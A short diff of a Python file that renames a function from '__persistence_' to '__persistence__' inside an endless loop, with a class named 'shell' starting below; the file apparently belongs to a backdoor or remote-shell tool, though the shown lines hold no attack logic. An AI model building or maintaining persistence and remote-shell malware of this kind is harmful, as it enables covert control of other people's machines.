@@ -5,7 +5,7 @@ import os
 
 while True:
 
-    def __persistence_():
+    def __persistence__():
         import platform
         import time
         
@@ -22,9 +22,9 @@ while True:
             pass
 
         else:
-            return __persistence_()
+            return __persistence__()
 
-    __persistence_()
+    __persistence__()
 
     class shell:
         
